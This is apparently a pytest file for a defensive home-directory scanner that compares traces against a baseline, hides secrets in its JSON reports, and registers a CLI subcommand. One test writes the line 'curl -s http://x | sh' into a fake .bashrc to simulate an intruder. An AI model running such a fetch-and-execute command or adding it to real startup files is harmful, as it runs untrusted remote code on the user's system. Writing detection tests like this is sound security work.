"""Watchpost scan, baseline/diff and CLI registration."""
from __future__ import annotations

import json
from pathlib import Path

from delfin.watchpost.scan import run_scan, load_baseline, diff_findings
from delfin.watchpost.model import Finding


def _clean_home(tmp_path: Path) -> Path:
    home = tmp_path / "home"
    (home / ".ssh").mkdir(mode=0o700, parents=True)
    (home / ".ssh" / "authorized_keys").write_text(
        "ssh-ed25519 AAAA me@host\n")
    (home / ".bashrc").write_text("export EDITOR=vim\n")
    return home


def test_first_run_stores_baseline_and_reports(tmp_path):
    home = _clean_home(tmp_path)
    report = tmp_path / "report"
    findings = run_scan(home, report)
    assert isinstance(findings, list)
    bl = load_baseline(report)
    assert bl is not None
    assert bl["authorized_keys"] == ["ssh-ed25519 AAAA me@host"]


def test_diff_reports_only_new_traces(tmp_path):
    home = _clean_home(tmp_path)
    report = tmp_path / "report"
    run_scan(home, report)
    # an intruder lands
    (home / ".bashrc").write_text("export EDITOR=vim\ncurl -s http://x | sh\n")
    findings = run_scan(home, report, mode="diff")
    assert any(f.severity == "alert" and "curl" in f.what.lower()
               for f in findings)
    assert not any(f.severity == "info" for f in findings)


def test_unchanged_home_reports_nothing_in_diff(tmp_path):
    home = _clean_home(tmp_path)
    report = tmp_path / "report"
    run_scan(home, report)
    assert run_scan(home, report, mode="diff") == []


def test_report_is_json_and_secret_free(tmp_path):
    home = _clean_home(tmp_path)
    report = tmp_path / "report"
    (home / ".bash_history").write_text(
        "export AWS_SECRET_ACCESS_KEY=abcd1234efgh\n")
    run_scan(home, report)
    files = list(report.iterdir())
    assert files, "a report file must be written"
    text = files[0].read_text()
    assert "abcd1234efgh" not in text
    json.loads(text)


def test_diff_findings_new_vs_seen():
    old = Finding("ssh", "info", "/p", None, "a", "r")
    new = Finding("ssh", "alert", "/p", None, "b", "r")
    out = diff_findings([old, new], [old])
    assert [f.what for f in out] == ["b"]


# --- CLI registration ----------------------------------------------------

def test_watchpost_is_a_registered_subcommand():
    import delfin.agent.cli as cli
    parser = cli.build_parser()
    known = cli._subcommand_names(parser)
    assert "watchpost" in known
